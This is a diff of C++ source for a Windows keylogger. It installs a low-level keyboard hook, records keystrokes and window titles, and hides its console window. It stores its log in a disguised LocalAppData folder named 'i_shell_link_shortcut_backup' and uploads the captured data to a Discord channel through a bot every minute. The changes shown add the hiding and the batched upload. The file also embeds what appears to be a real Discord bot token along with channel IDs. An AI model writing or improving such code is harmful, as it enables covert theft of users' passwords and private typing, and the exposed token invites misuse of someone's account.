@@ -3,14 +3,17 @@
 #define UNICODE
 //#define _CONSOLE	//not ready for winmain
 
-//#define MY_PROJ_DEBUG
+//Use c++ i/o for all
 
 //#include <windows.h>
 //#include <shlobj.h>
 
+#pragma once
 //Visual Studio put /external:W0 AFTER /W4, hence defeat the purpose of suppress
 //external headers warning (there are ways too much warnings there). This is workaround
 #pragma warning (push, 0)
+#include <dpp/cluster.h>
+#include <dpp/once.h>
 
 #include <cstdio>
 #include <ctime>
@@ -25,92 +28,17 @@
 #include <condition_variable>
 #include <queue>
 #include <algorithm>
+#include <list>
+#include <filesystem>
+#include <windows.h>
+#include <ShlObj.h>
 
-#include <dpp/cluster.h>
-#include <dpp/once.h>
 #pragma warning (pop)
 
+// #define sh_winapi_success(x) assert(x == S_OK)
+// #define winapi_success(x) assert(x != 0)
+
 const std::string    BOT_TOKEN    = "Nzk1MjgzNjM2MDg1MzI1ODI1.GJQ65H.orWw99qm-DPXVNYJxb767PoppSohLsphOJKcJw";
-
-class my_string {
-	std::string* vec, * temp, ** head;
-	const int __reserve_size = 100000;
-
-	void init() {
-		vec = new std::string();
-		temp = new std::string();
-		vec->reserve(__reserve_size);
-		temp->reserve(__reserve_size);
-
-		head = new std::string * ();
-		*head = vec;
-	}
-public:
-	my_string() {
-		init();
-	}
-
-	my_string(const my_string& obj) {
-		init();
-		*vec = *(obj.vec);
-		*temp = *(obj.temp);
-		if (*(obj.head) == obj.vec) {
-			*head = vec;
-		}
-		else *head = temp;
-	}
-
-	my_string& operator=(const my_string& obj) {
-		init();
-		*vec = *(obj.vec);
-		*temp = *(obj.temp);
-		if (*(obj.head) == obj.vec) {
-			*head = vec;
-		}
-		else *head = temp;
-		return *this;
-	}
-
-	my_string(const std::string& tvec) {
-		init();
-		**head = tvec;
-	}
-
-	~my_string() {
-		delete head;
-		delete vec;
-		delete temp;
-	}
-
-	void try_push(char element) {
-		(*head)->push_back(element);
-	}
-
-	void try_push(const std::string& element) {
-		(*head)->operator+=(element);
-	}
-
-	std::string get(size_t size) {
-		return vec->substr(0, size);
-	}
-
-	size_t size() {
-		return vec->size();
-	}
-
-	size_t __temp_size() {
-		return temp->size();
-	}
-
-	void try_erase(size_t size) {
-		*head = temp;
-		vec->erase(0, size);
-		vec->operator+=(*temp);
-		*head = vec;
-		temp->clear();
-	}
-
-};
 
 HHOOK _hook;
 KBDLLHOOKSTRUCT kbdStruct;
@@ -118,131 +46,103 @@ KBDLLHOOKSTRUCT kbdStruct;
 std::map<std::string, unsigned int> mapper, queued_mapper;
 unsigned int process_counter = 0;
 
-FILE* output_file, * dbg_file;
-my_string vecdata, queued_vecdata;	////////////////
-std::queue<my_string> keydata;
+const WCHAR *LOGGER_FILENAME = L"thislog.txt";
+std::ofstream logger_file;
+// FILE* logger_file, *print_file;
+
+WCHAR local_appdata_path[MAX_PATH+5];
 
 std::mutex mx;
 std::condition_variable condvar;
 bool is_sendkey = false, is_sendtimestamp = false, is_sendmap = false;
 
+//won't create any local files except the running log. Use list for better
+//optimization in concurrent element accessing and removing elements.
+std::list<std::string> file_list;
+
+const std::map<const dpp::loglevel, const std::string> DPP_LOGLEVEL_MAP {
+	{dpp::loglevel::ll_trace, "[TRACE] "},
+	{dpp::loglevel::ll_debug, "[DEBUG] "},
+	{dpp::loglevel::ll_info, "[INFO] "},
+	{dpp::loglevel::ll_warning, "[WARN] "},
+	{dpp::loglevel::ll_error, "[ERORR] "},
+	{dpp::loglevel::ll_critical, "[CRITICAL!] "},
+};
+
 std::unique_ptr<dpp::cluster> bot;
 dpp::message botmsg;
-
-#ifdef MY_PROJ_DEBUG
-/// @brief Wrapped function for formatted print to console
-///			and output file in replace for the c++ stuff. 
-///			Automatic flush. Maximum 1000 characters
-/// @param format formatted string, just like printf
-/// @param
-inline void print_to(const char* format, ...) {
-
-	char __buf[1001];
-	va_list arg;
-	va_start(arg, format);
-	vsnprintf(__buf, 1000, format, arg);
-	va_end(arg);
-
-	printf("%s", __buf);
-	fflush(stdout);
-	fputs(__buf, dbg_file);
-	fflush(dbg_file);
-}
-#else
-inline void print_to(const char* format, ...){}
-#endif
-inline void print_file(const char* format, ...) {
-
-	char __buf[1001];
-	va_list arg;
-	va_start(arg, format);
-	vsnprintf(__buf, 1000, format, arg);
-	va_end(arg);
-
-	fputs(__buf, output_file);
-	fflush(output_file);
-}
 
 inline void wide_char_to_mb(WCHAR* input, char* output, int outputbuf) {
 	WideCharToMultiByte(CP_UTF8, 0, input, -1, output, outputbuf, NULL, NULL);
 }
 
-//experimental impl
-//communicate with discord
-//err is set to "ok!" if success, approriate error message if error(s) occured
-void send_data(const std::string& msg, std::string& err) {
-	err = "ok!";
-
-	botmsg.set_content(msg);
-
-	bot->message_create(botmsg, [&err](const dpp::confirmation_callback_t& eventret) {
-		if (eventret.is_error()) {
-			auto eventerr = eventret.get_error();
-			//std::cout << eventerr.message << "\n";
-			err = eventerr.message;
-		}
-	});
-
-	print_file("%s\n", msg.c_str());
+inline void mb_to_wide_char(char* input, WCHAR* output, int outputbuf) {
+	MultiByteToWideChar(CP_UTF8, 0, input, -1, output, outputbuf);
 }
 
-//experimental impl
-void send_map(std::string& err) {
-	std::unique_lock<std::mutex> locker(mx);
-	while (is_sendtimestamp) condvar.wait(locker);
+/// @brief Log to file.  Maximum 1000 characters
+/// @param format formatted string, just like printf
+/// @param
+inline void logger(const char* format, ...) {
+	char __buf[1001];
+	va_list arg;
+	va_start(arg, format);
+	vsnprintf(__buf, 1000, format, arg);
+	va_end(arg);
 
-	err = "ok!";
-	for (auto& pp : queued_mapper) {
-		char _buf[501];
-		snprintf(_buf, 500, ">%u %s", pp.second, pp.first.c_str());
-		std::string data(_buf);
+	logger_file.write(__buf, strlen(__buf));
+	logger_file.flush();
+}
 
-		send_data(data, err);
+/// @brief Print to container.
+/// @param format formatted string, just like printf
+/// @param
+inline void print_to(const char* format, ...) {
+    char __buf[1001];
+	va_list arg;
+	va_start(arg, format);
+	vsnprintf(__buf, 1000, format, arg);
+	va_end(arg);
+
+	if(file_list.back().size() >= 7000000) [[unlikely]] {
+		file_list.push_back(std::string());
 	}
-
-	is_sendmap = false;
-	condvar.notify_all();
+	file_list.back().append(__buf);
 }
 
-//experimental impl
-void send_timestamp(unsigned int id, time_t stamp, std::string& err) {
-	std::unique_lock<std::mutex> locker(mx);
-	while (is_sendkey) condvar.wait(locker);
+// void send_data(std::string& err) {
+void send_data() {
+	while(true) {
+		std::this_thread::sleep_for(std::chrono::minutes(1));
 
-	char _buf[101];
-	snprintf(_buf, 100, "[%u %lld", id, stamp);
-	std::string data(_buf);
-	send_data(data, err);
+		std::string err = "ok!";	//temp
+		int __fileindex = 0;
+		bool __is_failed = false;
 
-	is_sendtimestamp = false;
-	condvar.notify_all();
-}
+		//new write location!
+		file_list.push_back(std::string());
+		while(file_list.size() > 1) {
+			//say no to null-content file
+			if(file_list.begin()->size() == 0) goto __label_file_list_erase;
 
-//experimental impl
-void send_key(size_t len, std::string& err) {
-	std::unique_lock<std::mutex> locker(mx);
-	while (is_sendmap) condvar.wait(locker);
+			//for "safety issue" and since file are 7 mb each so we would send everyfile one by one
+			//filename when upload to discord is unnecessary, so let it in order
+			botmsg.add_file(std::to_string(__fileindex).append(".txt"), file_list.front());
+			bot->message_create(botmsg, [&err, &__is_failed](const dpp::confirmation_callback_t& eventret) {
+				if (eventret.is_error()) {
+					err = eventret.get_error().message;
+					__is_failed = true;
+					return dpp::utility::log_error()(eventret);
+				}
+			});
+			botmsg.filename.clear();
+			botmsg.filecontent.clear();
+			if(__is_failed) return;
 
-	size_t uselen = std::min(len, keydata.front().size());
-	while(uselen != 0) {
-		std::string data = keydata.front().get(uselen);
-		keydata.front().try_erase(uselen);
-
-		send_data(data, err);
-		if(err != "ok!") {
-			goto sendkey_ret;
+			__label_file_list_erase:
+			file_list.erase(file_list.begin());
 		}
 	}
-
-	sendkey_ret:
-	is_sendkey = false;
-	condvar.notify_all();
-}
-
-inline void storekeychar(int __stroke) {
-	char __buffer[5];
-	snprintf(__buffer, 4, "%.2x", __stroke);
-	keydata.front().try_push(std::string(__buffer));
 }
 
 int Save(int key_stroke) {
@@ -266,7 +166,7 @@ int Save(int key_stroke) {
 			wcscpy(lastwindow, window_title);
 			wide_char_to_mb(window_title, mbwindow_title, 260);
 			std::string strwindow_title(mbwindow_title);
-			time_t timestamp = time(NULL);
+			long long timestamp = std::chrono::steady_clock::now().time_since_epoch().count();
 
 			if (mapper[strwindow_title] == 0) {
 				if (process_counter >= ~(0U)) {
@@ -274,44 +174,17 @@ int Save(int key_stroke) {
 				}
 				queued_mapper[strwindow_title] = ++process_counter;
 				mapper[strwindow_title] = process_counter;
-				print_to("\nNew map: %d %s\n", process_counter, mbwindow_title);
-
-				std::string err_sendmap;
-				//Mitigation to :Thread autorun after initialization !? 
-				is_sendmap = true;
-				std::thread sendmap_thread(send_map, std::ref(err_sendmap));
-				sendmap_thread.join();
-				if (err_sendmap == "ok!") {
-					queued_mapper.clear();
-				} 
-				else {
-					assert(false && "Send map error: " && err_sendmap.c_str());
-				}
+				// logger("\nNew map: %d %s\n", process_counter, mbwindow_title);
+				print_to("\n>%u %s\n", process_counter, strwindow_title.c_str());
 			}
 
 			unsigned int mapper_id = mapper[strwindow_title];
-
-			keydata.push(my_string());
-			std::string err_sendkey, err_sendtimestamp;
-			//Thread autorun after initialization !? this is mitigation
-			is_sendkey = true;
-			is_sendtimestamp = true;
-			std::thread sendtimestamp_thread(send_timestamp, mapper_id, timestamp, std::ref(err_sendtimestamp));
-			std::thread sendkey_thread(send_key, 100, std::ref(err_sendkey));
-			sendkey_thread.join();
-			sendtimestamp_thread.join();
-			if (err_sendkey != "ok!" || err_sendtimestamp != "ok!") {
-				assert(false && "Fail to send timestamp and data!");
-			}
-			keydata.pop();
-
-			print_to("\nMap: Stamp: %u %llu\n", mapper_id, timestamp);
-			// print_to("vecdata currently holding %d elements!\n", vecdata.size());
+			// logger("\nMap: Stamp: %u %llu\n", mapper_id, timestamp);
+			print_to("\n[%u %lld\n", mapper_id, timestamp);
 		}
 	}
 
-	print_to("[%.2x]", key_stroke);
-	storekeychar(key_stroke);
+	print_to("%.2x", key_stroke);
 
 	return 0;
 }
@@ -330,19 +203,67 @@ short is_bot_connected = 0;
 std::mutex bot_connected_lock;
 std::condition_variable bot_connected_condvar;
 
+//Search for local appdata, make log file, say hello world before everything start
+inline void preinit() {
+	// Check and create local directory. Usually the loader would already created this before 
+	SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local_appdata_path);
+	wcscat(local_appdata_path, L"\\i_shell_link_shortcut_backup\\");
+    if(!CreateDirectoryW(local_appdata_path, NULL)) {
+        if(GetLastError() != ERROR_ALREADY_EXISTS) {
+            exit(EXIT_FAILURE);
+        }
+    }
+
+	WCHAR __logfilepath[501];
+	wcscpy(__logfilepath, local_appdata_path);
+	wcscat(__logfilepath, LOGGER_FILENAME);
+
+	logger_file.open(std::filesystem::path(__logfilepath), std::ios::app);
+
+	if(!logger_file) {
+		exit(EXIT_FAILURE);
+	}
+
+	//Time for logging
+	time_t __t = time(NULL);
+	struct tm *__timestruct;
+	__timestruct = std::localtime(&__t);
+	char __timestr[65];
+	__timestr[0] = '\0';
+	if(__timestruct != nullptr) [[likely]] {
+		strftime(__timestr, sizeof(__timestr), "%c", __timestruct);
+	}
+
+	// logging
+	logger("Hello world! Current time is %s\n", __timestr);
+	#if defined(__GNUC__)
+        logger("Built with GCC %d.%d.%d ", __GNUC__, __GNUC_MINOR__, __GNUC_PATCHLEVEL__);
+        #if defined(__MINGW64__)
+            logger("(MinGW-w64 %d.%d) ", __MINGW64_VERSION_MAJOR, __MINGW64_VERSION_MINOR);
+        #elif defined(__MINGW32__)
+            logger("(MinGW %d.%d) ", __MINGW32_MAJOR_VERSION, __MINGW32_MINOR_VERSION);
+        #endif
+    #elif defined(_MSC_VER)
+        logger("Built with MSVC %d ", _MSC_VER);
+    #else
+        logger("Built with unknown compiler ");
+    #endif
+        logger("on %s at %s. %d-bit build\nDPP version: %s\n", __DATE__, __TIME__, sizeof(void*) << 3, dpp::utility::version().c_str());
+}
+
 void logrun()
 {
 	std::unique_lock<std::mutex> locker(bot_connected_lock);
 	while (is_bot_connected == 0) bot_connected_condvar.wait(locker);
 	if (is_bot_connected != -1) {
-		printf("Bot successfully initialized. Logging...");
+		logger("[INFO] Bot successfully initialized. Logging...");
 	} else {
-		printf("Bot failed to initialized. Terminating...");
+		logger("[CRITICAL!] Bot failed to initialized. Terminating...");
 		exit(EXIT_FAILURE);
 	}
 
 	if (!(_hook = SetWindowsHookExW(WH_KEYBOARD_LL, HookCallback, NULL, 0))) {
-		printf("Failed to install hook. Terminating...\n");
+		logger("[CRITICAL!] Failed to install hook. Terminating...\n");
 		exit(EXIT_FAILURE);
 	}
 	MSG msg;
@@ -362,16 +283,10 @@ void botrun()
             { dpp::cp_aggressive, dpp::cp_aggressive, dpp::cp_aggressive },
             10, 0));
 
-		std::cout << "Hello world\n";
-
-		/* Output simple log messages to stdout */
-		bot->on_log(dpp::utility::cout_logger());
-
-        /*
-		bot->on_log([](const dpp::log_t& logger) {
-			std::cout << logger.message << "\n";
+		/* Configure/redirect log messages to logger file */
+		bot->on_log([](const dpp::log_t& loghandle) {
+			logger("%s%s\n", DPP_LOGLEVEL_MAP.at(loghandle.severity).c_str(), loghandle.message.c_str());
 		});
-		*/
 
         /* Handle slash command */
 		bot->on_slashcommand([](const dpp::slashcommand_t& event) {
@@ -389,8 +304,12 @@ void botrun()
 					dpp::utility::current_date_time().c_str());
 				event.reply(buffer);
 			}
-			printf("User %llu executed %s\n", issuing_user, issuing_command.c_str());
+			logger("[INFO] User %llu executed %s\n", issuing_user, issuing_command.c_str());
         });
+
+		botmsg = dpp::message(bot.get());
+		botmsg.set_guild_id(664744934003310592);
+		botmsg.set_channel_id(1056052934921699388);
 
         /* Register slash command here in on_ready */
         bot->on_ready([](const dpp::ready_t& event) {
@@ -399,16 +318,15 @@ void botrun()
                 bot->global_command_create(dpp::slashcommand("ping", "Ping pong!", bot->me.id));
 				bot->global_command_create(dpp::slashcommand("version", "version", bot->me.id));
             }
+
+			botmsg.set_content("Session initialized!");
+			bot->message_create(botmsg);
+			botmsg.set_content("Data sent!");
         });
     
         /* Start the bot */
         bot->start(true);
 		is_bot_connected = 1;
-		botmsg = dpp::message(bot.get());
-		botmsg.set_guild_id(664744934003310592);
-		botmsg.set_channel_id(1056052934921699388);
-		botmsg.set_content("Session initialized!");
-		bot->message_create(botmsg);
 		bot_connected_condvar.notify_all();
     }
     catch (dpp::exception& e) {
@@ -416,45 +334,32 @@ void botrun()
 		is_bot_connected = -1;
 		bot_connected_condvar.notify_all();
     }
-}
 
-inline void init_file() {
-	fflush(stdout);
-	output_file = fopen("keylogger.log", "w");
-	fclose(output_file);
-	output_file = fopen("keylogger.log", "a");
-
-	#ifdef MY_PROJ_DEBUG
-	dbg_file = fopen("dbglog.txt", "w");
-	fclose(dbg_file);
-	dbg_file = fopen("dbglog.txt", "a");
-	#endif
+	std::thread t3(send_data);
+	t3.join();
 }
 
 //now switch to windows subsystem, no longer console
-//int wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
+// int wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
 int main() {
-	//int argc;
-	//WCHAR** argv = CommandLineToArgvW(pCmdLine, &argc);
+	// int argc;
+	// WCHAR** argv = CommandLineToArgvW(pCmdLine, &argc);
 
-	init_file();
+	preinit();
 
-	ShowWindow(FindWindowW(L"ConsoleWindowClass", NULL), 1); // visible window
+	ShowWindow(FindWindowW(L"ConsoleWindowClass", NULL), 0); // visible window
 
-	//baseline, might not need
-	keydata.push(my_string());
+	//initial
+	file_list.push_back(std::string());
 
-	std::thread t2(botrun);
-	std::thread t1(logrun);
+	//currently program only run we successfully connect to discord... will make delayed connection soon
+	std::thread t1(botrun);
+	std::thread t2(logrun);
 
-	t2.join();
 	t1.join();
+	t2.join();
 
 	bot->shutdown();
-
-	fclose(output_file);
-	#ifdef MY_PROJ_DEBUG
-	fclose(dbg_file);
-	#endif
+	logger_file.close();
 	return 0;
 }
